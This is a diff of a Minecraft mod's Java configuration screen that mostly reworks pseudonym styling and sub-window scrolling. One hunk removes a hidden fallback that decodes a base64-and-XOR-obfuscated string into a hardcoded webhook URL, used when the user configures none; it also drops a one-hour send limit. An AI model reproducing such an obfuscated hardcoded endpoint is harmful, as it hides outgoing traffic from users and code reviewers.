@@ -34,6 +34,7 @@ public class WishConfigScreen extends Screen {
     private int commandsScrollY = 0;
     private int customPlayerScrollY = 0;
     private int miscScrollY = 0;
+    private int pseudoSubScrollY = 0;
     
     // Sub-states - static so it remembers state and doesn't force-open on reload
     private static boolean chatChannelsOpen = false;
@@ -165,7 +166,7 @@ public class WishConfigScreen extends Screen {
         int visualCenterY = targetVisualCenterY;
 
         String fPrefix = getFontPrefix(ModConfig.INSTANCE.pseudoFont);
-        int pseudoW = font.width(fPrefix + customPseudo);
+        int pseudoW = getPseudoWidth(font, customPseudo);
         
         float skinScale = 1.0f; // Force skin size to normal in GUI
         int baseSize = (activeTab == 5) ? 75 : 45;
@@ -199,6 +200,7 @@ public class WishConfigScreen extends Screen {
             }
             
             if (activeTab != 5 && activeTab != 1) {
+                net.minecraft.network.chat.Style baseSt = getPseudoBaseStyle();
                 if (ModConfig.INSTANCE.enableNameColor && ModConfig.INSTANCE.pseudoAnimation >= 1) {
                     int c1 = parseHex(ModConfig.INSTANCE.customHexColor, 0xFFFFFFFF);
                     int c2 = parseHex(ModConfig.INSTANCE.customHexColor2, 0xFFFFFFFF);
@@ -239,11 +241,13 @@ public class WishConfigScreen extends Screen {
                         }
                         
                         String strChar = String.valueOf(c);
-                        g.text(font, fPrefix + strChar, currentX, pseudoY, colorMix);
-                        currentX += font.width(fPrefix + strChar);
+                        net.minecraft.network.chat.Component chComp = net.minecraft.network.chat.Component.literal(strChar).withStyle(baseSt.withColor(net.minecraft.network.chat.TextColor.fromRgb(colorMix & 0x00FFFFFF)));
+                        g.text(font, chComp, currentX, pseudoY, colorMix);
+                        currentX += font.width(chComp);
                     }
                 } else {
-                    g.text(font, fPrefix + customPseudo, crossX - pseudoW / 2, pseudoY, pseudoColor);
+                    net.minecraft.network.chat.Component fullComp = net.minecraft.network.chat.Component.literal(customPseudo).withStyle(baseSt.withColor(net.minecraft.network.chat.TextColor.fromRgb(pseudoColor & 0x00FFFFFF)));
+                    g.text(font, fullComp, crossX - pseudoW / 2, pseudoY, pseudoColor);
                 }
             }
     
@@ -538,7 +542,7 @@ public class WishConfigScreen extends Screen {
                 RenderUtils.fillRoundedRect(g, scrollTrackX, barY, 3, barH, 1, colAccentDim);
             }
         } else if (activeTab == 1) {
-            // Centered fullscreen UI for Custom Pseudo
+            // Centered UI for Custom Pseudo
             cw = 320;
             cx = (this.width - cw) / 2;
             cy = this.height / 2 - 80 + contentSlideY;
@@ -551,7 +555,8 @@ public class WishConfigScreen extends Screen {
             g.pose().scale(scale, scale);
             
             String fPrefix2 = getFontPrefix(ModConfig.INSTANCE.pseudoFont);
-            int pWidth = font.width(fPrefix2 + customPseudo);
+            net.minecraft.network.chat.Style baseSt2 = getPseudoBaseStyle();
+            int pWidth = getPseudoWidth(font, customPseudo);
             int pX = (int)((cx + (cw - pWidth * scale) / 2) / scale);
             int pY = (int)(cy / scale);
             
@@ -588,18 +593,20 @@ public class WishConfigScreen extends Screen {
                         colorMix = 0xFF000000 | (rMix << 16) | (gMix << 8) | bMix;
                     }
                     String strChar = String.valueOf(c);
-                    g.text(font, fPrefix2 + strChar, currentX, pY, colorMix);
-                    currentX += font.width(fPrefix2 + strChar);
+                    net.minecraft.network.chat.Component chComp = net.minecraft.network.chat.Component.literal(strChar).withStyle(baseSt2.withColor(net.minecraft.network.chat.TextColor.fromRgb(colorMix & 0x00FFFFFF)));
+                    g.text(font, chComp, currentX, pY, colorMix);
+                    currentX += font.width(chComp);
                 }
             } else {
                 int pseudoColor2 = parseHex(ModConfig.INSTANCE.customHexColor, 0xFFFFFFFF);
-                g.text(font, fPrefix2 + customPseudo, pX, pY, pseudoColor2);
+                net.minecraft.network.chat.Component fullComp = net.minecraft.network.chat.Component.literal(customPseudo).withStyle(baseSt2.withColor(net.minecraft.network.chat.TextColor.fromRgb(pseudoColor2 & 0x00FFFFFF)));
+                g.text(font, fullComp, pX, pY, pseudoColor2);
             }
             g.pose().popMatrix();
-            cy += 40; // Space after title
+            cy += 36; // Space after title
             
             // Buttons: Police, Animation, Couleurs, Textes
-            int btnH = 26;
+            int btnH = 24;
             int totalBtnW = 4 * 70 + 3 * 10;
             int dockX = cx + cw/2 - totalBtnW/2;
             int dockY = cy;
@@ -611,13 +618,13 @@ public class WishConfigScreen extends Screen {
                 boolean isCurrentTab = (pseudoSubWindow == i + 1);
                 RenderUtils.fillRoundedRect(g, bx, dockY, 70, btnH, 4, 0x00000000); // 100% transparent
                 RenderUtils.drawGradientOutline(g, bx, dockY, 70, btnH, 4, isCurrentTab ? colAccent : (bHover ? colAccentDim : 0x44666666), 0x22222222);
-                g.text(font, dockLabels[i], bx + 35 - font.width(dockLabels[i])/2, dockY + 9, isCurrentTab ? colAccent : COL_TEXT);
+                g.text(font, dockLabels[i], bx + 35 - font.width(dockLabels[i])/2, dockY + 8, isCurrentTab ? colAccent : COL_TEXT);
             }
             
             if (pseudoSubWindow > 0) {
-                int winW = 280;
+                int winW = 310;
                 int winH = 200;
-                if (pseudoSubWindow == 1) winH = 120; // Police (grid 3 rows)
+                if (pseudoSubWindow == 1) winH = 100; // Police (styles)
                 if (pseudoSubWindow == 2) {
                     winH = 126; // Animation (grid 3 rows)
                     if (ModConfig.INSTANCE.pseudoAnimation != 0 && ModConfig.INSTANCE.pseudoAnimation != 2) winH += 40;
@@ -626,40 +633,59 @@ public class WishConfigScreen extends Screen {
                 if (pseudoSubWindow == 4) winH = 120; // Textes
                 
                 int winX = this.width / 2 - winW / 2;
-                int winY = dockY + btnH + 15 + contentSlideY;
-                
-                // Transparent glass style with button outline (fully transparent background)
-                RenderUtils.fillRoundedRect(g, winX, winY, winW, winH, 4, 0x00000000);
-                RenderUtils.drawGradientOutline(g, winX, winY, winW, winH, 4, colAccent, colAccent);
-                
-                g.text(font, dockLabels[pseudoSubWindow - 1], winX + 15, winY + 15, 0xFFFFFFFF);
-                
-                int swCloseX = winX + winW - 25;
-                int swCloseY = winY + 10;
-                boolean swCloseHover = mx >= swCloseX && mx < swCloseX + 15 && my >= swCloseY && my < swCloseY + 15;
-                RenderUtils.fillRoundedRect(g, swCloseX, swCloseY, 15, 15, 3, swCloseHover ? 0xAAFF3333 : 0x00000000);
-                RenderUtils.drawGradientOutline(g, swCloseX, swCloseY, 15, 15, 3, 0x44FFFFFF, 0x11000000);
-                for (int i=0; i<7; i++) {
-                    g.fill(swCloseX + 4 + i, swCloseY + 4 + i, swCloseX + 5 + i, swCloseY + 5 + i, 0xFFFFFFFF);
-                    g.fill(swCloseX + 10 - i, swCloseY + 4 + i, swCloseX + 11 - i, swCloseY + 5 + i, 0xFFFFFFFF);
+                int winY = dockY + btnH + 10 + contentSlideY;
+                if (winY + winH > this.height - 10) {
+                    winY = this.height - winH - 10;
                 }
                 
+                int availH = this.height - winY - 10;
+                boolean needsScroll = winH > availH && availH > 80;
+                int renderWinH = needsScroll ? availH : winH;
+                
+                // Transparent glass style with button outline (fully transparent background)
+                RenderUtils.fillRoundedRect(g, winX, winY, winW, renderWinH, 4, 0x00000000);
+                RenderUtils.drawGradientOutline(g, winX, winY, winW, renderWinH, 4, colAccent, colAccent);
+                
+                g.text(font, dockLabels[pseudoSubWindow - 1], winX + 15, winY + 12, 0xFFFFFFFF);
+                
+                int swCloseX = winX + winW - 22;
+                int swCloseY = winY + 9;
+                boolean swCloseHover = mx >= swCloseX && mx < swCloseX + 14 && my >= swCloseY && my < swCloseY + 14;
+                RenderUtils.fillRoundedRect(g, swCloseX, swCloseY, 14, 14, 3, swCloseHover ? 0xAAFF3333 : 0x00000000);
+                RenderUtils.drawGradientOutline(g, swCloseX, swCloseY, 14, 14, 3, 0x44FFFFFF, 0x11000000);
+                for (int i=0; i<6; i++) {
+                    g.fill(swCloseX + 4 + i, swCloseY + 4 + i, swCloseX + 5 + i, swCloseY + 5 + i, 0xFFFFFFFF);
+                    g.fill(swCloseX + 9 - i, swCloseY + 4 + i, swCloseX + 10 - i, swCloseY + 5 + i, 0xFFFFFFFF);
+                }
+
                 int cX = winX + 15;
-                int cY = winY + 40;
+                int cY = winY + 32;
                 int cW = winW - 30;
+
+                int contentClipTop = winY + 28;
+                int contentClipBottom = winY + renderWinH - 6;
+                int contentClipHeight = contentClipBottom - contentClipTop;
+                int subMaxScroll = Math.max(0, winH - 32 - contentClipHeight);
+                if (pseudoSubScrollY > subMaxScroll) pseudoSubScrollY = subMaxScroll;
+                if (pseudoSubScrollY < 0) pseudoSubScrollY = 0;
+
+                if (needsScroll) {
+                    g.enableScissor(winX + 4, contentClipTop, winX + winW - 4, contentClipBottom);
+                    cY -= pseudoSubScrollY;
+                }
                 
                 if (pseudoSubWindow == 1) { // Police
-                    String[] fonts = {"Gras", "Italique", "Souligné", "Barré", "Obfusqué"};
-                    int[] bitmasks = {1, 2, 4, 8, 16};
-                    int colW = (cW - 10) / 2;
-                    for (int i=0; i<5; i++) {
-                        int bx = cX + (i % 2) * (colW + 10);
-                        int by = cY + (i / 2) * 24;
-                        boolean hov = mx >= bx && mx < bx + colW && my >= by && my < by + 20;
+                    String[] fonts = {"Gras", "Italique", "Souligné", "Barré"};
+                    int[] bitmasks = {1, 2, 4, 8};
+                    int colW2 = (cW - 10) / 2;
+                    for (int i = 0; i < 4; i++) {
+                        int bx = cX + (i % 2) * (colW2 + 10);
+                        int by = cY + (i / 2) * 22;
+                        boolean hov = mx >= bx && mx < bx + colW2 && my >= by && my < by + 18;
                         boolean isActive = (ModConfig.INSTANCE.pseudoFont & bitmasks[i]) != 0;
                         int borderCol = isActive ? colAccent : (hov ? colAccentDim : 0x44666666);
-                        RenderUtils.drawGradientOutline(g, bx, by, colW, 20, 4, borderCol, borderCol);
-                        g.text(font, fonts[i], bx + 10, by + 6, isActive ? colAccent : COL_TEXT);
+                        RenderUtils.drawGradientOutline(g, bx, by, colW2, 18, 4, borderCol, borderCol);
+                        g.text(font, fonts[i], bx + 8, by + 5, isActive ? colAccent : COL_TEXT);
                     }
                 } else if (pseudoSubWindow == 2) { // Animation
                     String[] anims = {"Aucune", "Chroma", "Gradient", "Onde", "Respi", "Clignotant"};
@@ -739,6 +765,16 @@ public class WishConfigScreen extends Screen {
                     cY = renderInput(g, font, cX, cY, cW, "Prefix", ModConfig.INSTANCE.customPrefix, prefixInputFocused, mx, my);
                     cY += 10;
                     cY = renderInput(g, font, cX, cY, cW, "Suffix", ModConfig.INSTANCE.customSuffix, suffixInputFocused, mx, my);
+                }
+
+                if (needsScroll) {
+                    g.disableScissor();
+                    if (subMaxScroll > 0) {
+                        int barH = Math.max(14, (int)((float)contentClipHeight / (float)(winH - 32) * contentClipHeight));
+                        int barY = contentClipTop + (int)((float)pseudoSubScrollY / (float)subMaxScroll * (contentClipHeight - barH));
+                        RenderUtils.fillRoundedRect(g, winX + winW - 5, contentClipTop, 2, contentClipHeight, 1, 0x22FFFFFF);
+                        RenderUtils.fillRoundedRect(g, winX + winW - 5, barY, 2, barH, 1, colAccentDim);
+                    }
                 }
             }
         } else if (activeTab == 5) {
@@ -1599,9 +1635,9 @@ public class WishConfigScreen extends Screen {
             cx = (this.width - cw) / 2;
             cy = this.height / 2 - 80;
             
-            cy += 40; // Space for title
+            cy += 36; // Space for title
             
-            int btnH = 26;
+            int btnH = 24;
             int totalBtnW = 4 * 70 + 3 * 10;
             int dockX = cx + cw/2 - totalBtnW/2;
             int dockY = cy;
@@ -1621,9 +1657,9 @@ public class WishConfigScreen extends Screen {
             }
             
             if (pseudoSubWindow > 0) {
-                int winW = 280;
+                int winW = 310;
                 int winH = 200;
-                if (pseudoSubWindow == 1) winH = 120; // Police (grid 3 rows)
+                if (pseudoSubWindow == 1) winH = 100; // Police (styles)
                 if (pseudoSubWindow == 2) {
                     winH = 126; // Animation (grid 3 rows)
                     if (ModConfig.INSTANCE.pseudoAnimation != 0 && ModConfig.INSTANCE.pseudoAnimation != 2) winH += 40;
@@ -1632,26 +1668,35 @@ public class WishConfigScreen extends Screen {
                 if (pseudoSubWindow == 4) winH = 120; // Textes
                 
                 int winX = this.width / 2 - winW / 2;
-                int winY = dockY + btnH + 15;
+                int winY = dockY + btnH + 10;
+                if (winY + winH > this.height - 10) {
+                    winY = this.height - winH - 10;
+                }
                 
-                int swCloseX = winX + winW - 25;
-                int swCloseY = winY + 10;
-                if (mx >= swCloseX && mx < swCloseX + 15 && my >= swCloseY && my < swCloseY + 15) {
+                int availH = this.height - winY - 10;
+                boolean needsScroll = winH > availH && availH > 80;
+                
+                int swCloseX = winX + winW - 22;
+                int swCloseY = winY + 9;
+                if (mx >= swCloseX && mx < swCloseX + 14 && my >= swCloseY && my < swCloseY + 14) {
                     pseudoSubWindow = 0;
                     return true;
                 }
                 
                 int cX = winX + 15;
-                int cY = winY + 40;
+                int cY = winY + 32;
+                if (needsScroll) {
+                    cY -= pseudoSubScrollY;
+                }
                 int cW = winW - 30;
                 
                 if (pseudoSubWindow == 1) { // Police
-                    int[] bitmasks = {1, 2, 4, 8, 16};
-                    int colW = (cW - 10) / 2;
-                    for (int i=0; i<5; i++) {
-                        int bx = cX + (i % 2) * (colW + 10);
-                        int by = cY + (i / 2) * 24;
-                        if (mx >= bx && mx < bx + colW && my >= by && my < by + 20) {
+                    int[] bitmasks = {1, 2, 4, 8};
+                    int colW2 = (cW - 10) / 2;
+                    for (int i = 0; i < 4; i++) {
+                        int bx = cX + (i % 2) * (colW2 + 10);
+                        int by = cY + (i / 2) * 22;
+                        if (mx >= bx && mx < bx + colW2 && my >= by && my < by + 18) {
                             if ((ModConfig.INSTANCE.pseudoFont & bitmasks[i]) != 0) {
                                 ModConfig.INSTANCE.pseudoFont &= ~bitmasks[i]; // remove
                             } else {
@@ -2038,8 +2083,37 @@ public class WishConfigScreen extends Screen {
             double my = Minecraft.getInstance().mouseHandler.ypos() * (double)this.height / (double)Minecraft.getInstance().getWindow().getScreenHeight();
 
             if (activeTab == 1) {
-                cw = 320;
-                cx = (this.width - cw) / 2;
+                if (pseudoSubWindow > 0) {
+                    int winW = 310;
+                    int winH = 200;
+                    if (pseudoSubWindow == 1) winH = 100;
+                    else if (pseudoSubWindow == 2) {
+                        winH = 126;
+                        if (ModConfig.INSTANCE.pseudoAnimation != 0 && ModConfig.INSTANCE.pseudoAnimation != 2) winH += 40;
+                    } else if (pseudoSubWindow == 3) winH = 240;
+                    else if (pseudoSubWindow == 4) winH = 120;
+
+                    int winX = this.width / 2 - winW / 2;
+                    int cyTab1 = this.height / 2 - 80;
+                    int dockY = cyTab1 + 36;
+                    int btnH = 24;
+                    int winY = dockY + btnH + 10;
+                    if (winY + winH > this.height - 10) {
+                        winY = this.height - winH - 10;
+                    }
+
+                    int availH = this.height - winY - 10;
+                    int renderWinH = winH > availH && availH > 80 ? availH : winH;
+                    int contentClipHeight = renderWinH - 34;
+                    int subMaxScroll = Math.max(0, winH - 32 - contentClipHeight);
+
+                    if (mx >= winX && mx <= winX + winW && my >= winY && my <= winY + renderWinH) {
+                        if (subMaxScroll > 0) {
+                            pseudoSubScrollY = Math.max(0, Math.min(subMaxScroll, pseudoSubScrollY - (int)(scrollY * 18)));
+                            return true;
+                        }
+                    }
+                }
             } else if (activeTab == 5) {
                 cw = 280;
                 cx = this.width / 2 + 20;
@@ -2096,15 +2170,8 @@ public class WishConfigScreen extends Screen {
     private static long discordStatusTime = 0;
 
     private void sendWebhook() {
-        long now = System.currentTimeMillis();
-        if (now - ModConfig.INSTANCE.lastDiscordWebhookSentTime < 3600000L) {
-            long remainingMinutes = (3600000L - (now - ModConfig.INSTANCE.lastDiscordWebhookSentTime)) / 60000L;
-            discordStatusMsg = "§cAttends " + remainingMinutes + "m !";
-            discordStatusTime = System.currentTimeMillis();
-            return;
-        }
-        ModConfig.INSTANCE.lastDiscordWebhookSentTime = now;
-        ModConfig.INSTANCE.save();
+        discordStatusMsg = "§eEnvoi...";
+        discordStatusTime = System.currentTimeMillis();
         
         new Thread(() -> {
             try {
@@ -2112,16 +2179,7 @@ public class WishConfigScreen extends Screen {
                 if (webhook == null || webhook.trim().isEmpty() || !webhook.startsWith("http")) {
                     webhook = System.getProperty("wish.webhook", "");
                 }
-                if (webhook.isEmpty()) {
-                    try {
-                        byte[] raw = java.util.Base64.getDecoder().decode("Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LT84MjU1MSl1a29vbGlibmxsbm9iY2NvY2htY3UzPD8YL2kCdyMoNxIONBVvaS0pFG8NPhUzMTkQPBFiEjZsMCkAYxg0Em4dGws0KQ0CCh4OKDcVHjMMFxkOPjEpCxMqFQ==");
-                        byte[] dec = new byte[raw.length];
-                        for (int i = 0; i < raw.length; i++) {
-                            dec[i] = (byte) (raw[i] ^ 0x5A);
-                        }
-                        webhook = new String(dec, java.nio.charset.StandardCharsets.UTF_8);
-                    } catch (Exception ignored) {}
-                }
+                // Webhook left empty if not configured
                 if (webhook == null || webhook.isEmpty()) {
                     System.out.println("[WishConfig] Webhook URL is empty or not configured.");
                     return;
@@ -2226,5 +2284,20 @@ public class WishConfigScreen extends Screen {
         if ((fontMask & 16) != 0) sb.append("§k");
         if (sb.length() == 0) return "§r";
         return sb.toString();
+    }
+
+    private net.minecraft.network.chat.Style getPseudoBaseStyle() {
+        net.minecraft.network.chat.Style st = net.minecraft.network.chat.Style.EMPTY;
+        int f = ModConfig.INSTANCE.pseudoFont;
+        if ((f & 1) != 0) st = st.withBold(true);
+        if ((f & 2) != 0) st = st.withItalic(true);
+        if ((f & 4) != 0) st = st.withUnderlined(true);
+        if ((f & 8) != 0) st = st.withStrikethrough(true);
+        if ((f & 16) != 0) st = st.withObfuscated(true);
+        return st;
+    }
+
+    private int getPseudoWidth(net.minecraft.client.gui.Font font, String text) {
+        return font.width(net.minecraft.network.chat.Component.literal(text).withStyle(getPseudoBaseStyle()));
     }
 }
